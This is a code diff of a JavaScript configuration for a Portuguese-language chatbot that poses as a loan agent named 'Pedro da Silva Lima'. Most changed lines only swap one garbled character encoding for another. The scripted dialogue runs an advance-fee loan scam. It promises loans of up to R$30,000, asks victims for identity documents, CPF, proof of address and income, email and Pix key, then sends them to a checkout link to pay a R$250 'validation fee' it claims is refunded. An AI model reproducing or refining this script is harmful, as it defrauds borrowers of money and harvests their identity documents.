@@ -1,14 +1,14 @@
 // +---------------------------------------------------------------+
-// |  CONFIGURA«√O DO CHATBOT - PEDRO DA SILVA LIMA                |
-// |  EmprÈstimo Seguro ï 2026 ï Total TransparÍncia               |
+// |  CONFIGURA√á√ÉO DO CHATBOT - PEDRO DA SILVA LIMA                |
+// |  Empr√©stimo Seguro ‚Ä¢ 2026 ‚Ä¢ Total Transpar√™ncia               |
 // +---------------------------------------------------------------+
 
 window.CONFIG = {
   
   // -------------------------------------------------------------
-  // ?? IDENTIFICA«√O
+  // ?? IDENTIFICA√á√ÉO
   // -------------------------------------------------------------
-  botName: "Pedro da Silva Lima",
+  botName: "Pedro",
   botPhoto: "imagens/perfil.jpg",
   
   // -------------------------------------------------------------
@@ -22,7 +22,7 @@ window.CONFIG = {
   // -------------------------------------------------------------
   mensagens: {
     
-    // SaudaÁ„o por hor·rio
+    // Sauda√ß√£o por hor√°rio
     saudacao() {
       const hora = new Date().getHours();
       if (hora >= 5 && hora < 12) return "Bom dia! ??";
@@ -33,27 +33,27 @@ window.CONFIG = {
     // Etapa 1: Pedir nome
     pedirNome() {
       const saudacao = this.saudacao();
-      return `${saudacao} Meu nome È <b>Pedro da Silva Lima</b>.<br>
-Atuo h· mais de <b>12 anos</b> no segmento de emprÈstimos online, sempre com foco total em <b>seguranÁa, transparÍncia e atendimento direto</b>.<br><br>
+      return `${saudacao} Meu nome √© <b>Pedro da Silva Lima</b>.<br>
+Atuo h√° mais de <b>12 anos</b> no segmento de empr√©stimos online, sempre com foco total em <b>seguran√ßa, transpar√™ncia e atendimento direto</b>.<br><br>
 Antes de continuarmos, poderia me dizer seu <b>nome completo</b>? ??`;
     },
     
-    // Etapa 2: ApresentaÁ„o + proposta + tabela
+    // Etapa 2: Apresenta√ß√£o + proposta + tabela
     apresentacao(nome) {
       return `Prazer, ${nome}! ??<br><br>
-Sou o Pedro, e trabalho de forma <b>direta, sem intermedi·rios</b> ó vocÍ fala comigo do inÌcio ao fim.<br><br>
-?? <b>IMPORTANTE ñ LEIA COM ATEN«√O</b><br>
-?? Este È meu ˙nico canal oficial de atendimento.<br>
-?? N„o trabalho com terceiros ou parceiros.<br>
+Sou o Pedro, e trabalho de forma <b>direta, sem intermedi√°rios</b> ‚Äî voc√™ fala comigo do in√≠cio ao fim.<br><br>
+?? <b>IMPORTANTE ‚Äì LEIA COM ATEN√á√ÉO</b><br>
+?? Este √© meu √∫nico canal oficial de atendimento.<br>
+?? N√£o trabalho com terceiros ou parceiros.<br>
 ? Desconfie de qualquer outro contato se passando por mim.<br><br>
-?? <b>COMO FUNCIONA ñ 2026</b><br>
-? Taxa ˙nica de <b>R$ 250,00</b> para validaÁ„o do contrato digital.<br>
-? Valor liberado em atÈ <b>15 minutos</b> apÛs confirmaÁ„o.<br>
+?? <b>COMO FUNCIONA ‚Äì 2026</b><br>
+? Taxa √∫nica de <b>R$ 250,00</b> para valida√ß√£o do contrato digital.<br>
+? Valor liberado em at√© <b>15 minutos a 24 horas</b> ap√≥s confirma√ß√£o.<br>
 ? Contrato digital com todos os comprovantes.<br>
-? A taxa È devolvida como bonificaÁ„o na ˙ltima parcela!<br><br>
+? A taxa √© devolvida como bonifica√ß√£o na √∫ltima parcela!<br><br>
 ?? <b>Por que R$250?</b><br>
-Essa taxa cobre: emiss„o/autenticaÁ„o do contrato, custos operacionais e validaÁ„o de dados ó garantindo que ambas as partes estejam comprometidas.<br><br>
-?? <b>TABELA DE EMPR…STIMOS ñ 2026</b><br>
+Essa taxa cobre: emiss√£o/autentica√ß√£o do contrato, custos operacionais e valida√ß√£o de dados ‚Äî garantindo que ambas as partes estejam comprometidas.<br><br>
+?? <b>TABELA DE EMPR√âSTIMOS ‚Äì 2026</b><br>
 R$ 2.000 ? 20x de R$ 120<br>
 R$ 3.000 ? 20x de R$ 180<br>
 R$ 4.000 ? 30x de R$ 160<br>
@@ -65,31 +65,31 @@ R$ 9.000 ? 48x de R$ 225<br>
 R$ 10.000 ? 38x de R$ 289,47<br>
 R$ 20.000 ? 48x de R$ 500<br>
 R$ 30.000 ? 50x de R$ 720<br><br>
-?? VocÍ tem interesse em seguir com esse processo?<br>
-Responda com: <b>"sim"</b>, <b>"ok"</b>, <b>"interesse"</b>, <b>"ok tenho interesse"</b> ou <b>"n„o tenho interesse"</b>`;
+?? Voc√™ tem interesse em seguir com esse processo?<br>
+Responda com: <b>"sim"</b>, <b>"ok"</b>, <b>"interesse"</b>, <b>"ok tenho interesse"</b> ou <b>"n√£o tenho interesse"</b>`;
     },
     
-    // Etapa 3: Documentos + informaÁıes do emprÈstimo
+    // Etapa 3: Documentos + informa√ß√µes do empr√©stimo
     documentos(nome) {
       return `Excelente, ${nome}! ??<br><br>
-Para validar seu cadastro e liberar o emprÈstimo, preciso dos seguintes documentos:<br><br>
+Para validar seu cadastro e liberar o empr√©stimo, preciso dos seguintes documentos:<br><br>
 ? <b>Fotos do RG ou CNH</b> (frente e verso)<br>
 ? <b>CPF</b><br>
-? <b>Comprovante de residÍncia</b> (conta de luz, ·gua ou extrato banc·rio ó atÈ 90 dias)<br>
-? <b>Comprovante de renda</b> (holerite, contracheque ou extrato banc·rio)<br>
-? <b>E-mail v·lido</b><br>
-? <b>Chave Pix</b> (para liberaÁ„o r·pida)<br><br>
-?? ApÛs enviar os documentos, informe tambÈm:<br>
-ï <b>Valor desejado</b> (a partir de R$ 2.000)<br>
-ï <b>Forma de pagamento da taxa</b>: <b>Pix</b> ou <b>Boleto</b><br>
-ï <b>Data de vencimento das parcelas</b>: <b>10</b>, <b>20</b> ou <b>30</b><br><br>
-?? Envie tudo aqui mesmo pelo bot„o de anexo (??).<br><br>
-ApÛs enviar, digite uma das palavras abaixo para prosseguir:<br>
-ï <b>"ENVIADO"</b><br>
-ï <b>"FEITO"</b><br>
-ï <b>"PRONTO"</b><br>
-ï <b>"OK"</b><br>
-ï <b>"CONCLUÕDO"</b><br><br>
+? <b>Comprovante de resid√™ncia</b> (conta de luz, √°gua ou extrato banc√°rio ‚Äî at√© 90 dias)<br>
+? <b>Comprovante de renda</b> (holerite, contracheque ou extrato banc√°rio)<br>
+? <b>E-mail v√°lido</b><br>
+? <b>Chave Pix</b> (para libera√ß√£o r√°pida)<br><br>
+?? Ap√≥s enviar os documentos, informe tamb√©m:<br>
+‚Ä¢ <b>Valor desejado</b> (a partir de R$ 2.000)<br>
+‚Ä¢ <b>Forma de pagamento da taxa</b>: <b>Pix</b> ou <b>Boleto</b><br>
+‚Ä¢ <b>Data de vencimento das parcelas</b>: <b>10</b>, <b>20</b> ou <b>30</b><br><br>
+?? Envie tudo aqui mesmo pelo bot√£o de anexo (??).<br><br>
+Ap√≥s enviar, digite uma das palavras abaixo para prosseguir:<br>
+‚Ä¢ <b>"ENVIADO"</b><br>
+‚Ä¢ <b>"FEITO"</b><br>
+‚Ä¢ <b>"PRONTO"</b><br>
+‚Ä¢ <b>"OK"</b><br>
+‚Ä¢ <b>"CONCLU√çDO"</b><br><br>
 ?? Assim que confirmar, enviarei o link do checkout para pagamento da taxa de <b>R$ 250,00</b>.`;
     },
     
@@ -97,26 +97,26 @@ ApÛs enviar, digite uma das palavras abaixo para prosseguir:<br>
     checkoutLink(nome) {
       // ?? Substitua pelo seu link real do EvoPay
       const link = "https://app.evopay.cash/checkout/SEU_ID_AQUI";
-      return `? ”timo, ${nome}! Todos os documentos e informaÁıes recebidos.<br><br>
-Agora, para liberar seu emprÈstimo, basta pagar a taxa ˙nica de <b>R$ 250,00</b> via checkout seguro:<br><br>
+      return `? √ìtimo, ${nome}! Todos os documentos e informa√ß√µes recebidos.<br><br>
+Agora, para liberar seu empr√©stimo, basta pagar a taxa √∫nica de <b>R$ 250,00</b> via checkout seguro:<br><br>
 ?? <a href="${link}" target="_blank"><b>?? ACESSAR CHECKOUT (R$ 250,00)</b></a><br><br>
-?? ApÛs o pagamento, envie o <b>comprovante do Pix</b> aqui mesmo.<br>
-? Seu emprÈstimo ser· liberado em atÈ <b>24 horas</b> apÛs confirmaÁ„o.`;
+?? Ap√≥s o pagamento, envie o <b>comprovante do Pix</b> aqui mesmo.<br>
+? Seu empr√©stimo ser√° liberado em at√© <b>15 minutos a 24 horas</b> ap√≥s confirma√ß√£o.`;
     },
     
     // Etapa 5: Sem interesse
     semInteresse(nome) {
       return `Tudo bem, ${nome}! ??<br>
-Respeito totalmente sua decis„o. Se no futuro precisar de um emprÈstimo seguro e transparente, estarei por aqui.<br><br>
-Tenha um Ûtimo dia! ??`;
+Respeito totalmente sua decis√£o. Se no futuro precisar de um empr√©stimo seguro e transparente, estarei por aqui.<br><br>
+Tenha um √≥timo dia! ??`;
     },
     
-    // Etapa 6: Mensagem padr„o
+    // Etapa 6: Mensagem padr√£o
     padrao(nome) {
       return `${nome}, por favor, responda com:<br>
-ï <b>"sim"</b>, <b>"ok"</b>, <b>"interesse"</b> ou <b>"ok tenho interesse"</b><br>
-ï <b>"n„o tenho interesse"</b><br><br>
-Ou envie seus documentos usando o bot„o ??.`;
+‚Ä¢ <b>"sim"</b>, <b>"ok"</b>, <b>"interesse"</b> ou <b>"ok tenho interesse"</b><br>
+‚Ä¢ <b>"n√£o tenho interesse"</b><br><br>
+Ou envie seus documentos usando o bot√£o ??.`;
     }
   }
 };
